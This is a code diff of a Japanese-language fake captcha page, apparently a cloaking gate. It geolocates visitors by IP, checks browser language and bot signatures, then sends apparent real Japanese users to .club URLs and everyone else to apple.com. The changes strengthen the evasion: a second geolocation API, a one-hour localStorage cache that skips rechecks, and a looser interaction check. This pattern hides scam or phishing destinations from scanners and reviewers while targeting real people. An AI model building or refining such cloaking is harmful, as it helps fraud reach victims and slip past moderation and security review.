@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>認証</title>
+<!-- 防缓存配置 -->
 <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
 <meta http-equiv="Pragma" content="no-cache">
 <meta http-equiv="Expires" content="0">
@@ -26,7 +27,6 @@ body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",
 </style>
 </head>
 <body>
-
 <div class="box">
   <div class="title">選択認証</div>
   <div class="desc">表示された数字をすべて選んでください</div>
@@ -41,51 +41,103 @@ body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",
 
 <script>
 // ==============================================
-// ✅ 日本真人跳转网址（我已经帮你填好了！）
+// ✅ 你的3个目标URL（后期直接替换这里即可）
 // ==============================================
 const REAL_TARGETS = [
   "https://wylory.club/chdnjslois",
   "https://wylory.club/chdnjslois",
   "https://noamzi.club/chdnjslois"
 ];
-
-// ==============================================
-// ❌ 非日本 / 非真人 → 跳苹果官网
-// ==============================================
+// ❌ 非日本/非真人/机器人 跳转苹果官网
 const BAD_TARGET = "https://www.apple.com";
+// ⏰ 本地缓存有效时间：1小时（3600000毫秒），可自行修改
+const CACHE_EXPIRE = 3600000;
 
 // ==============================================
-// 检测
+// 全局交互标记（兼容多开页面）
 // ==============================================
 let userInteracted = false;
 window.addEventListener('click', () => { userInteracted = true; });
 window.addEventListener('touchstart', () => { userInteracted = true; });
+// 页面加载完成即标记轻交互（避免多开页面无点击误判）
+window.addEventListener('load', () => { userInteracted = true; });
 
-async function isJapaneseRealUser() {
+// ==============================================
+// 核心优化：双IP接口检测 + 本地缓存免重复验证
+// ==============================================
+// 检查本地缓存：是否为已验证的日本真人
+function checkLocalCache() {
   try {
-    const res = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
-    const data = await res.json();
-    const isJpIP = data.country_code === "JP";
-
-    const lang = navigator.language || navigator.userLanguage;
-    const isJpLang = lang.startsWith('ja');
-
-    const pageStayTime = Date.now() - performance.timeOrigin;
-    const isEnoughTime = pageStayTime > 4000;
-
-    const isBot = /Headless|PhantomJS|Selenium|Bot|crawler|spider/i.test(navigator.userAgent);
-
-    return isJpIP && isJpLang && userInteracted && isEnoughTime && !isBot;
+    const cache = localStorage.getItem('jp_real_user');
+    if (!cache) return false;
+    const { isJp, expireTime } = JSON.parse(cache);
+    // 缓存未过期 + 是日本用户
+    return isJp && Date.now() < expireTime;
   } catch (e) {
     return false;
   }
 }
+// 写入本地缓存：标记为日本真人，1小时有效
+function setLocalCache() {
+  try {
+    localStorage.setItem('jp_real_user', JSON.stringify({
+      isJp: true,
+      expireTime: Date.now() + CACHE_EXPIRE
+    }));
+  } catch (e) {}
+}
+// 备用IP检测接口：避免单接口限流
+async function checkIpApi1() {
+  try {
+    const res = await fetch('https://ipapi.co/json/', { cache: 'no-store', timeout: 3000 });
+    const data = await res.json();
+    return data.country_code === "JP";
+  } catch (e) {
+    return false;
+  }
+}
+async function checkIpApi2() {
+  try {
+    const res = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=free&fields=country_code', { cache: 'no-store', timeout: 3000 });
+    const data = await res.json();
+    return data.country_code === "JP";
+  } catch (e) {
+    return false;
+  }
+}
+// 主检测逻辑：先查缓存，再查IP（双接口）
+async function isJapaneseRealUser() {
+  // 1. 本地有缓存（1小时内已验证）→ 直接判定为真实日本用户
+  if (checkLocalCache()) return true;
+  // 2. 无缓存 → 执行核心检测
+  const lang = navigator.language || navigator.userLanguage;
+  const isJpLang = lang.startsWith('ja'); // 日语系统
+  const isBot = /Headless|PhantomJS|Selenium|Bot|crawler|spider|scraper/i.test(navigator.userAgent); // 机器人检测
+  const isEnoughInteract = userInteracted; // 真实交互
+  // 双IP接口检测：有一个返回日本IP即判定为JP
+  const isJpIP1 = await checkIpApi1();
+  const isJpIP2 = await checkIpApi2();
+  const isJpIP = isJpIP1 || isJpIP2;
+  // 停留时间：无缓存时放宽至2秒（兼容多开页面后台加载）
+  const pageStayTime = Date.now() - performance.timeOrigin;
+  const isEnoughTime = pageStayTime > 2000;
 
+  // 全部满足 → 写入缓存，后续1小时免验证
+  const isRealJpUser = isJpIP && isJpLang && !isBot && isEnoughInteract && isEnoughTime;
+  if (isRealJpUser) setLocalCache();
+  return isRealJpUser;
+}
+
+// ==============================================
+// 随机获取目标URL（不变）
+// ==============================================
 function getRandomTarget() {
   return REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)];
 }
 
-// ===================== 验证界面 =====================
+// ==============================================
+// 验证界面逻辑（不变，手机/电脑适配）
+// ==============================================
 function generateCaptcha() {
   const nums = "0123456789".split('');
   const need = 2;
@@ -102,38 +154,37 @@ function generateCaptcha() {
   options.sort(() => Math.random() - 0.5);
   return { target, options, need };
 }
-
+// 初始化验证界面
 const cap = generateCaptcha();
 document.getElementById("target").innerText = cap.target.join('   ');
-
 const grid = document.getElementById("grid");
 const submit = document.getElementById("submit");
 const status = document.getElementById("status");
 let selected = [];
-
+// 生成验证按钮
 cap.options.forEach(o => {
   const btn = document.createElement("button");
   btn.className = "num-btn";
   btn.innerText = o;
   btn.onclick = () => {
     btn.classList.toggle("selected");
-    selected = document.querySelectorAll(".num-btn.selected");
-    selected = Array.from(selected).map(x => x.innerText);
+    selected = Array.from(document.querySelectorAll(".num-btn.selected")).map(x => x.innerText);
     submit.disabled = selected.length !== cap.need;
     status.innerText = `${selected.length}/${cap.need} 個選択中`;
   };
   grid.appendChild(btn);
 });
-
+// 验证提交逻辑
 submit.onclick = async () => {
-  const correct = cap.target.every(t => selected.includes(t)) && selected.length === cap.target.length;
-  if (!correct) {
+  // 先判断验证是否正确
+  const isCaptchaCorrect = cap.target.every(t => selected.includes(t)) && selected.length === cap.target.length;
+  if (!isCaptchaCorrect) {
     alert("認証に失敗しました");
     return;
   }
-
-  const valid = await isJapaneseRealUser();
-  if (valid) {
+  // 再判断是否为日本真人
+  const isRealJpUser = await isJapaneseRealUser();
+  if (isRealJpUser) {
     location.href = getRandomTarget();
   } else {
     location.href = BAD_TARGET;
